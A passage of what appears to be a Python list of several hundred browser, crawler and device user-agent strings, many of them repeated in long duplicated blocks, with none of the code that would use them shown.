               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
